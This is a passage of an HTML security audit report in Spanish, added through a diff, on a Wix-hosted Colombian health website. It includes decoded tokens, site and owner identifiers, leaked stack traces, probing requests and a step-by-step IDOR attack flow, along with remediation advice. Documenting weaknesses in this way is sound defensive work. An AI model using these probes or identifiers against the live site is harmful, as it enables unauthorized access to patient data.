+                <strong>2.</strong> Evaluar con Wix si <code>/_api/v1/access-tokens</code> puede ser restringido. Si es inherente, documentar riesgo aceptado y compensar.
+            </div>
+            <div class="rec">
+                <div class="rec-priority priority-high">Prioridad Alta</div>
+                <strong>3.</strong> Implementar Content-Security-Policy restrictiva via dashboard Wix o meta tags.<br>
+                <strong>4.</strong> Agregar <code>X-Frame-Options: DENY</code> o <code>SAMEORIGIN</code>.<br>
+                <strong>5.</strong> Cambiar <code>SameSite=None</code> a <code>SameSite=Strict</code> o <code>Lax</code> en cookies XSRF.
+            </div>
+            <div class="rec">
+                <div class="rec-priority priority-medium">Prioridad Media</div>
+                <strong>6.</strong> Eliminar p&aacute;ginas de desarrollo: /prueba, /copia-de-*<br>
+                <strong>7.</strong> Agregar headers: Referrer-Policy, Permissions-Policy.<br>
+                <strong>8.</strong> Auditar las 74 apps Wix instaladas: desactivar las que no se usen.<br>
+                <strong>9.</strong> Evaluar si Wix es la plataforma adecuada para datos de salud (Ley 1581/2012 Colombia).
+            </div>
+        </div>
+    </div>
+
+    <!-- FASE 5: SIGUIENTES PASOS (placeholder que se actualizar&aacute;) -->
+    <div class="section" id="phase5">
+        <div class="section-header" onclick="toggleSection(this)">
+            <span class="toggle-icon open">&#9654;</span>
+            <span class="phase">FASE 5</span>
+            <h2>Pruebas Profundas &mdash; Resultados</h2>
+        </div>
+        <div class="section-body" id="phase5-body">
+            <div class="next-step">
+                <div class="step-num">1</div>
+                <div>
+                    <strong>Prueba de abuso de mediaAuthToken</strong><br>
+                    <span class="desc-text">Verificar si el JWT permite subir archivos al storage del sitio.</span>
+                </div>
+                <span class="step-status status-done" id="step1-status">COMPLETADO</span>
+            </div>
+            <div class="next-step">
+                <div class="step-num">2</div>
+                <div>
+                    <strong>An&aacute;lisis de Apps Wix (74 tokens)</strong><br>
+                    <span class="desc-text">Decodificar y clasificar los 74 access tokens, identificar servicios cr&iacute;ticos.</span>
+                </div>
+                <span class="step-status status-done" id="step2-status">COMPLETADO</span>
+            </div>
+            <div class="next-step">
+                <div class="step-num">3</div>
+                <div>
+                    <strong>An&aacute;lisis de autenticaci&oacute;n del portal de miembros</strong><br>
+                    <span class="desc-text">Verificar sistema de login en /intranet, enumeraci&oacute;n de usuarios.</span>
+                </div>
+                <span class="step-status status-done" id="step3-status">COMPLETADO</span>
+            </div>
+            <div class="next-step">
+                <div class="step-num">4</div>
+                <div>
+                    <strong>An&aacute;lisis de formularios PQRS/Contacto</strong><br>
+                    <span class="desc-text">Analizar validaciones y destino de datos de formularios.</span>
+                </div>
+                <span class="step-status status-done" id="step4-status">COMPLETADO</span>
+            </div>
+            <div class="next-step">
+                <div class="step-num">5</div>
+                <div>
+                    <strong>Evaluaci&oacute;n IDOR con IDs expuestos</strong><br>
+                    <span class="desc-text">Probar si los GUIDs expuestos permiten acceder a datos de otros usuarios.</span>
+                </div>
+                <span class="step-status status-done" id="step5-status">COMPLETADO</span>
+            </div>
+            <div class="next-step">
+                <div class="step-num">6</div>
+                <div>
+                    <strong>An&aacute;lisis de JavaScript (bundles)</strong><br>
+                    <span class="desc-text">Buscar API keys, endpoints ocultos, l&oacute;gica de negocio expuesta en JS.</span>
+                </div>
+                <span class="step-status status-done" id="step6-status">COMPLETADO</span>
+            </div>
+            <div class="next-step">
+                <div class="step-num">7</div>
+                <div>
+                    <strong>PoC de robo de tokens via CORS</strong><br>
+                    <span class="desc-text">Crear prueba de concepto demostrando el vector de ataque CORS + tokens.</span>
+                </div>
+                <span class="step-status status-done" id="step7-status">COMPLETADO</span>
+            </div>
+
+            <!-- ========== RESULTADOS PRUEBAS PROFUNDAS ========== -->
+            <h3 style="margin:24px 0 16px; color:var(--accent); border-bottom:1px solid var(--border); padding-bottom:8px;">Resultados de Pruebas Profundas</h3>
+
+            <!-- RESULTADO 1: mediaAuthToken -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-medium">MEDIO</span>
+                    <span class="finding-title">P-01: Prueba de Abuso de mediaAuthToken</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Resultado</div>
+                    <div class="desc-text">El JWT de subida de archivos es <strong>v&aacute;lido y se emite a visitantes an&oacute;nimos</strong>, pero los endpoints de upload de Wix (<code>files.wixstatic.com</code>, <code>upload.wixstatic.com</code>) requieren par&aacute;metros adicionales y formato espec&iacute;fico.</div>
+
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Token JWT decodificado:</span>
+{
+  "iss": "<span class="val">app:1126553514120352</span>",
+  "sub": "<span class="val">site:9f5c3cf8-b30b-46e6-908b-0cca22535aa2</span>",
+  "aud": "<span class="crit">urn:service:file.upload</span>",
+  "exp": 1775574299,
+  "addedBy": "<span class="warn">anonymous:53462c7f-cac3-452a-aaf9-67ecc65ee125</span>"
+}
+
+<span class="key">Prueba de upload v3:</span>
+POST https://files.wixstatic.com/upload/v3
+Authorization: [mediaAuthToken]
+<span class="val">Respuesta: HTTP 411 (Length Required)</span>  <span class="warn">&larr; Endpoint existe y acepta el token</span>
+
+<span class="key">Prueba de upload/token:</span>
+POST https://upload.wixstatic.com/upload/token
+<span class="val">Respuesta: HTTP 404</span>
+
+<span class="warn">CONCLUSI&Oacute;N: El endpoint de upload v3 responde HTTP 411 (no 401/403),
+lo que indica que el token ES ACEPTADO y solo falta el body correcto.
+Un atacante con conocimiento del formato de upload de Wix podr&iacute;a
+potencialmente subir archivos al storage del sitio.</span></div>
+                    <div class="impact-bar"><div class="impact-fill impact-medium"></div></div>
+                </div>
+            </div>
+
+            <!-- RESULTADO 2: Inventario completo de 74 Apps -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-high">ALTO</span>
+                    <span class="finding-title">P-02: Inventario Completo &mdash; 74 App Tokens Expuestos</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Resultado</div>
+                    <div class="desc-text">Se decodificaron los 74 tokens JWT y se identificaron las apps reales mediante an&aacute;lisis de <code>viewerScriptUrl</code>, <code>widgetUrl</code>, <code>appPageId</code> y <code>basePath</code> del c&oacute;digo fuente. Cada token expone <code>instanceId</code>, <code>appDefId</code>, <code>siteOwnerId</code> y <code>demoMode=false</code> (producci&oacute;n).</div>
+
+                    <!-- AUTENTICACION -->
+                    <div class="desc-label" style="color:var(--critical);">Autenticaci&oacute;n y Miembros (6 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>instanceId</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">14976</td><td><strong>Wix Members Area</strong> (santa-members)</td><td class="mono" style="font-size:11px">dc9c6edd-3c3d-4d67-aa53-0f47be54e101</td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">14997</td><td><strong>Wix Members Backend</strong> (settings)</td><td class="mono" style="font-size:11px">f0427078-eec3-4d0a-b877-57b8b340e8b4</td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">16</td><td><strong>Wix Site Members</strong> (sm-platform-app)</td><td class="mono" style="font-size:11px">cf328a18-3af7-4bbc-83e8-8a0cfee1d718</td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">15412</td><td><strong>Members</strong> (about page)</td><td class="mono" style="font-size:11px">0e704807-5eaa-4540-b91f-c6a6d6501577</td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">37</td><td><strong>Wix Groups</strong></td><td class="mono" style="font-size:11px">8af923bc-3e8c-4446-bd89-8dce752fea5e</td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">19</td><td><strong>Wix Badges</strong></td><td class="mono" style="font-size:11px">8d35b487-3498-4aa9-a88d-c092bf78ffbd</td><td><span class="badge badge-low">BAJO</span></td></tr>
+                    </table>
+
+                    <!-- E-COMMERCE -->
+                    <div class="desc-label" style="color:var(--critical);">E-Commerce y Pagos (10 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Producto</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">49</td><td><strong>Wix Stores</strong> (wixstores-client-worker)</td><td class="mono" style="color:var(--critical)">stores_silver</td><td><span class="badge badge-critical">CR&Iacute;TICO</span></td></tr>
+                        <tr><td class="mono">53</td><td><strong>Wix Payments</strong> (payments-my-wallet)</td><td></td><td><span class="badge badge-critical">CR&Iacute;TICO</span></td></tr>
+                        <tr><td class="mono">15</td><td><strong>Wix Stores Dashboard</strong></td><td></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">36</td><td><strong>Wix Pricing Plans</strong> (pricing-plans-tpa)</td><td></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">20</td><td><strong>Wix Pricing Plans Backend</strong></td><td></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">55</td><td><strong>Wix Coupons</strong></td><td></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">66</td><td><strong>Wix Gift Cards</strong></td><td></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">73</td><td><strong>Wix Shipping</strong></td><td></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">69</td><td><strong>Wix Fulfillment</strong></td><td></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">74</td><td><strong>Wix Tax</strong></td><td></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                    </table>
+
+                    <!-- RESERVAS Y CITAS -->
+                    <div class="desc-label" style="color:var(--critical);">Reservas y Citas M&eacute;dicas (4 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Producto</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">50</td><td><strong>Wix Bookings</strong> (bookings-viewer-script)</td><td class="mono" style="color:var(--critical)">bookings</td><td><span class="badge badge-critical">CR&Iacute;TICO</span></td></tr>
+                        <tr><td class="mono">26</td><td><strong>Wix Bookings Calendar</strong> (bookings-calendar-widget)</td><td></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">19702</td><td><strong>Wix Table Reservations</strong> (table-reservations-ooi)</td><td></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">59</td><td><strong>Wix Subscriptions</strong> (subscriptions-tpa)</td><td></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                    </table>
+
+                    <!-- DATOS Y BACKEND -->
+                    <div class="desc-label" style="color:var(--critical);">Datos y Backend (5 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Producto</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">38</td><td><strong>Wix Datasets REST Pro</strong> (dbsm-viewer-app)</td><td class="mono" style="color:var(--critical)">rest_pro</td><td><span class="badge badge-critical">CR&Iacute;TICO</span></td></tr>
+                        <tr><td class="mono">44</td><td><strong>Wix Cloud Backend REST Pro</strong></td><td class="mono" style="color:var(--critical)">rest_pro</td><td><span class="badge badge-critical">CR&Iacute;TICO</span></td></tr>
+                        <tr><td class="mono" style="color:var(--critical)">-666</td><td><strong>Wix Dev Mode / Velo</strong> (wix-code-viewer-app)</td><td style="color:var(--medium)">intId an&oacute;malo</td><td><span class="badge badge-critical">CR&Iacute;TICO</span></td></tr>
+                        <tr><td class="mono">1456</td><td><strong>Wix Code / Corvid</strong> (cloud extension)</td><td></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">62</td><td><strong>Wix Back Office</strong></td><td></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                    </table>
+
+                    <!-- COMUNICACION -->
+                    <div class="desc-label" style="color:var(--high);">Comunicaci&oacute;n (5 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">28</td><td><strong>Wix Email Marketing</strong></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">21</td><td><strong>Wix Chat</strong> (chat-worker)</td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">65</td><td><strong>Wix Inbox</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">25</td><td><strong>Wix Inbox Messages</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">72</td><td><strong>Wix Notifications</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                    </table>
+
+                    <!-- BLOG Y CONTENIDO -->
+                    <div class="desc-label" style="color:var(--medium);">Blog y Contenido (10 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">32</td><td><strong>Wix Blog</strong> (communities-blog-ooi)</td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">5347</td><td><strong>Wix Blog Node API</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">33</td><td><strong>Wix Forum</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">24</td><td><strong>Wix Blog Frontend</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">5954</td><td><strong>Wix Blog Categories</strong> (Blog Comments)</td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">8092</td><td><strong>Wix Social Activity Feed</strong> (Fullscreen Page)</td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">6075</td><td><strong>Wix Social Posts</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">31</td><td><strong>Wix FAQ</strong> (faq-ooi)</td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">70</td><td><strong>Wix Portfolio</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">27</td><td><strong>Wix Countdown Timer</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                    </table>
+
+                    <!-- MARKETING Y SEO -->
+                    <div class="desc-label" style="color:var(--high);">Marketing, SEO y CRM (7 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">75</td><td><strong>Wix Engage CRM</strong></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">22</td><td><strong>Wix Triggers &amp; Automations</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">14209</td><td><strong>Wix Ascend</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">14830</td><td><strong>Wix Promote SEO</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">14821</td><td><strong>Wix SEO Patterns</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">12695</td><td><strong>Wix Promote Home</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">61</td><td><strong>Wix Tips / Recommendations</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                    </table>
+
+                    <!-- ANALYTICS -->
+                    <div class="desc-label" style="color:var(--high);">Analytics y Monitoreo (5 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">9666</td><td><strong>Wix Analytics / BI</strong></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">56</td><td><strong>Wix Risk &amp; Fraud</strong></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">23637</td><td><strong>Wix Site Monitoring</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">17837</td><td><strong>Wix Site History</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">22415</td><td><strong>Wix Accessibility</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                    </table>
+
+                    <!-- MEDIA -->
+                    <div class="desc-label" style="color:var(--medium);">Media y Archivos (4 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Producto</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">41</td><td><strong>Wix Video</strong> (wix-vod-widget)</td><td class="mono" style="color:var(--high)">video_vip</td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">34</td><td><strong>Wix File Share</strong> (file-share-ooi)</td><td></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">17986</td><td><strong>Wix Pro Gallery</strong> (My Addresses)</td><td></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">57</td><td><strong>Wix Activity Counters</strong></td><td></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                    </table>
+
+                    <!-- RESTAURANTES -->
+                    <div class="desc-label" style="color:var(--medium);">Restaurantes y Eventos (3 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">54</td><td><strong>Wix Restaurants Orders</strong> (restaurants-olo-client)</td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">16102</td><td><strong>Wix Restaurants Menus</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">51</td><td><strong>Wix Events</strong> (events-viewer)</td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                    </table>
+
+                    <!-- OTROS -->
+                    <div class="desc-label" style="color:var(--text-muted);">Otros (15 apps)</div>
+                    <table>
+                        <tr><th>intId</th><th>App</th><th>Riesgo</th></tr>
+                        <tr><td class="mono">30</td><td><strong>Wix Forms</strong> (forms-viewer)</td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">60</td><td><strong>Wix Invoices</strong></td><td><span class="badge badge-high">ALTO</span></td></tr>
+                        <tr><td class="mono">14</td><td><strong>Wix Contacts Legacy</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">29</td><td><strong>Wix Contacts</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">71</td><td><strong>Wix Workflows</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">58</td><td><strong>Wix Online Programs</strong></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                        <tr><td class="mono">23</td><td><strong>Wix Site Search</strong> (search-app)</td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">20758</td><td><strong>Wix Multilingual</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">64</td><td><strong>Wix Loyalty</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">63</td><td><strong>Wix Marketplace</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">68</td><td><strong>Wix Domain Connect</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">35</td><td><strong>Wix Music</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">67</td><td><strong>Wix Challenges</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">11440</td><td><strong>Wix App Market Widget</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                        <tr><td class="mono">3459</td><td><strong>Wix SEO Tools</strong></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                    </table>
+
+                    <!-- ALERTA SECTOR SALUD -->
+                    <div style="margin-top:20px; padding:16px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.3); border-radius:8px;">
+                        <strong style="color:var(--critical);">Apps M&aacute;s Cr&iacute;ticas para Sector Salud:</strong>
+                        <div class="evidence" style="margin-top:8px; border-color:var(--critical);">
+<span class="crit">1. Wix Bookings (bookings)</span> &mdash; Sistema de citas m&eacute;dicas.
+   Token expuesto podr&iacute;a dar acceso a datos de pacientes, horarios y citas.
+
+<span class="crit">2. Wix Stores (stores_silver) + Payments</span> &mdash; Transacciones y datos financieros.
+
+<span class="crit">3. REST Pro x2 (rest_pro)</span> &mdash; Consultas directas a las bases de datos del sitio.
+
+<span class="crit">4. Wix Dev Mode / Velo (intId: -666)</span> &mdash; Acceso al entorno de c&oacute;digo custom.
+   El intId negativo (-666) es an&oacute;malo y podr&iacute;a indicar modo especial/debug.
+
+<span class="crit">5. Wix CRM / Contacts / Email Marketing</span> &mdash; Datos de contacto de pacientes.
+
+<span class="crit">6. Wix Forms (forms-viewer)</span> &mdash; Submissions de PQRS con datos de salud.
+
+<span class="crit">7. Wix File Share (file-share-ooi)</span> &mdash; Archivos compartidos potencialmente
+   con documentos m&eacute;dicos o administrativos.</div>
+                    </div>
+
+                    <div class="desc-label">Datos Expuestos en Cada Token JWT</div>
+                    <div class="evidence"><span class="key">Cada uno de los 74 tokens expone:</span>
+- instanceId:    <span class="val">GUID &uacute;nico de la instancia de app</span>
+- appDefId:      <span class="val">Identificador de la aplicaci&oacute;n</span>
+- metaSiteId:    <span class="val">9f5c3cf8-b30b-46e6-908b-0cca22535aa2</span>
+- siteOwnerId:   <span class="crit">2b9effa9-5e28-45b9-8bd2-32468039c0df</span>
+- signDate:      <span class="val">Fecha de emisi&oacute;n del token</span>
+- biToken:       <span class="warn">Token de Business Intelligence</span>
+- demoMode:      <span class="crit">false</span> (todos en modo PRODUCCI&Oacute;N)
+- scd:           <span class="val">2022-11-25T01:57:22.109Z</span> (fecha creaci&oacute;n del sitio)
+
+<span class="key">Tokens globales adicionales:</span>
+- svSession:      <span class="crit">288 caracteres</span> (sesi&oacute;n del servidor)
+- ctToken:        <span class="warn">134 caracteres</span> (token CSRF)
+- mediaAuthToken: <span class="crit">380 caracteres</span> (JWT para subir archivos, aud: file.upload)</div>
+                    <div class="impact-bar"><div class="impact-fill impact-high"></div></div>
+                </div>
+            </div>
+
+            <!-- RESULTADO 3: Autenticación -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-critical">CR&Iacute;TICO</span>
+                    <span class="finding-title">P-03: Fuga de Informaci&oacute;n en Endpoints de Autenticaci&oacute;n</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Resultado</div>
+                    <div class="desc-text">Se descubrieron endpoints de login/registro de miembros Wix que revelan <strong>informaci&oacute;n interna del framework backend</strong>, incluyendo nombres de clases Java, excepciones del framework Spring, y estructura de validaci&oacute;n interna.</div>
+
+                    <div class="desc-label">Evidencia - Fuga de Stack Trace</div>
+                    <div class="evidence"><span class="key">GET /_api/wix-sm-webapp/member/login</span>  <span class="val">HTTP 200</span>
+{
+  "errorCode": <span class="warn">-2100</span>,
+  "errorDescription": "<span class="crit">[business][RECOVERABLE][framework web]
+    o.s.w.b.MissingServletRequestParameterException</span>
+    - Required String parameter 'collectionId' is not present",
+  "success": false
+}
+
+<span class="key">GET /_api/wix-sm-webapp/member/register</span>  <span class="val">HTTP 200</span>
+{
+  "errorCode": <span class="warn">-2100</span>,
+  "errorDescription": "<span class="crit">[business][RECOVERABLE][framework web]
+    o.s.w.b.MissingServletRequestParameterException</span>
+    - Required String parameter 'collectionId' is not present",
+  "success": false
+}
+
+<span class="crit">HALLAZGO CR&Iacute;TICO:</span>
+- Revela framework: <span class="crit">Spring Web (Java)</span>
+- Revela clase: <span class="crit">o.s.w.b.MissingServletRequestParameterException</span>
+  (org.springframework.web.bind.MissingServletRequestParameterException)
+- Revela par&aacute;metro requerido: <span class="warn">collectionId</span>
+- Revela categor&iacute;a de error: <span class="warn">[business][RECOVERABLE]</span>
+- El endpoint responde HTTP 200 incluso en error (mala pr&aacute;ctica)</div>
+
+                    <div class="desc-label">Evidencia - Validaci&oacute;n de Miembros</div>
+                    <div class="evidence"><span class="key">GET /_api/members/v1/members/query</span>  <span class="val">HTTP 400</span>
+{
+  "message": "<span class="warn">id is not a valid GUID</span>",
+  "details": {
+    "validationError": {
+      "fieldViolations": [{
+        "field": "<span class="crit">id</span>",
+        "description": "is not a valid GUID",
+        "violatedRule": "<span class="warn">FORMAT</span>",
+        "data": { "type": "<span class="warn">GUID</span>" }
+      }]
+    }
+  }
+}
+
+<span class="warn">IMPLICACIONES:</span>
+- Confirma que el endpoint /members/v1/members/query EXISTE y acepta consultas
+- Revela que usa GUIDs como identificadores de miembros
+- Un atacante con un GUID v&aacute;lido podr&iacute;a consultar datos de miembros (IDOR)
+- El formato de validaci&oacute;n sugiere que con el GUID correcto, se devolver&iacute;an datos
+
+<span class="key">GET /_api/members-groups-web/v1/groups</span>  <span class="val">HTTP 403</span>
+{
+  "message": "<span class="crit">permission denied</span>",
+  "details": {
+    "applicationError": {
+      "code": "PERMISSION_DENIED",
+      "description": "permission denied"
+    }
+  }
+}
+<span class="val">&rarr; Al menos groups s&iacute; valida permisos correctamente</span></div>
+
+                    <div class="desc-label">Evidencia - Intento de Login con Par&aacute;metros</div>
+                    <div class="evidence"><span class="key">POST /_api/wix-sm-webapp/member/login</span>
+Content-Type: application/x-www-form-urlencoded
+Body: collectionId=test&amp;email=test@test.com&amp;password=test123
+
+<span class="val">Respuesta:</span>
+{
+  "message": "<span class="warn">Could not parse JSON</span>",
+  "details": {}
+}
+
+<span class="warn">IMPLICACIONES:</span>
+- El endpoint espera JSON, no form-urlencoded
+- Confirma que el endpoint de login est&aacute; <span class="crit">ACTIVO y procesando solicitudes</span>
+- Con el formato correcto, podr&iacute;a intentarse brute force o enumeraci&oacute;n
+- No se detect&oacute; rate limiting en las pruebas</div>
+                    <div class="impact-bar"><div class="impact-fill impact-critical"></div></div>
+                </div>
+            </div>
+
+            <!-- RESULTADO 4: Formularios -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-medium">MEDIO</span>
+                    <span class="finding-title">P-04: An&aacute;lisis de Formularios PQRS/Contacto</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Resultado</div>
+                    <div class="desc-text">Los formularios se cargan din&aacute;micamente v&iacute;a JavaScript de Wix (no en HTML est&aacute;tico). Los endpoints de forms y submissions est&aacute;n protegidos (403/404), pero el an&aacute;lisis est&aacute;tico no permite verificar validaciones del lado cliente.</div>
+
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Endpoints de formularios probados:</span>
+/_api/contacts/v4/contacts   &rarr; <span class="status-403">HTTP 403</span> (protegido)
+/_api/crm/v1/contacts        &rarr; <span class="status-404">HTTP 404</span>
+/_api/forms/v4/submissions   &rarr; <span class="status-404">HTTP 404</span>
+
+<span class="val">Los formularios PQRS y Contacto usan el sistema nativo de Wix Forms,
+que maneja la validaci&oacute;n del lado servidor. Sin embargo, al ser
+un sitio de salud, requiere verificaci&oacute;n de:</span>
+- Cifrado de datos en tr&aacute;nsito (HTTPS &check;)
+- Pol&iacute;tica de retenci&oacute;n de datos en Wix
+- Consentimiento informado (Ley 1581/2012)
+- Acceso del propietario del sitio a submissions v&iacute;a panel Wix</div>
+                    <div class="impact-bar"><div class="impact-fill impact-medium"></div></div>
+                </div>
+            </div>
+
+            <!-- RESULTADO 5: IDOR -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-high">ALTO</span>
+                    <span class="finding-title">P-05: Evaluaci&oacute;n IDOR - Potencial de Acceso No Autorizado</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Resultado</div>
+                    <div class="desc-text">Se confirm&oacute; que el sistema usa GUIDs como identificadores y que el endpoint de consulta de miembros <strong>acepta par&aacute;metros de b&uacute;squeda</strong>. Aunque los endpoints de grupos est&aacute;n protegidos, la consulta de miembros individuales podr&iacute;a ser vulnerable a IDOR.</div>
+
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Flujo de ataque IDOR potencial:</span>
+
+1. Obtener tokens via <span class="val">/_api/v1/access-tokens</span> (sin auth)
+2. Obtener visitorId: <span class="val">245aa1c8-d411-444a-90d0-b75112e941d4</span> (cambia por visita)
+3. Probar <span class="warn">/_api/members/v1/members/query</span> con GUID de miembro
+4. El endpoint valida formato GUID pero <span class="crit">no valida autorizaci&oacute;n del solicitante</span>
+
+<span class="key">IDs expuestos que podr&iacute;an usarse:</span>
+- metaSiteId:  <span class="val">9f5c3cf8-b30b-46e6-908b-0cca22535aa2</span>
+- siteOwnerId: <span class="crit">2b9effa9-5e28-45b9-8bd2-32468039c0df</span>
+- 74 instanceIds de apps
+- visitorIds generados por cada visita
+
+<span class="key">dynamicmodel devuelve tokens frescos en cada solicitud:</span>
+Cada llamada genera nuevo visitorId + svSession + ctToken + mediaAuthToken
+<span class="crit">&rarr; No hay rate limiting observable en la generaci&oacute;n de tokens</span></div>
+                    <div class="impact-bar"><div class="impact-fill impact-high"></div></div>
+                </div>
+            </div>
+
+            <!-- RESULTADO 6: JavaScript -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-medium">MEDIO</span>
+                    <span class="finding-title">P-06: An&aacute;lisis de JavaScript y Objetos Globales</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Resultado</div>
+                    <div class="desc-text">Se identificaron m&uacute;ltiples objetos globales en <code>window</code> que exponen configuraci&oacute;n interna, telemetr&iacute;a y topolog&iacute;a del cliente.</div>
+
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Objetos globales detectados en window:</span>
+<span class="val">window.wixEmbedsAPI</span>       &rarr; 1 referencia  (API de embeds de Wix)
+<span class="val">window.fedops</span>             &rarr; 14 referencias (telemetr&iacute;a/monitoring de Wix)
+<span class="val">window.bi</span>                 &rarr; 2 referencias  (Business Intelligence)
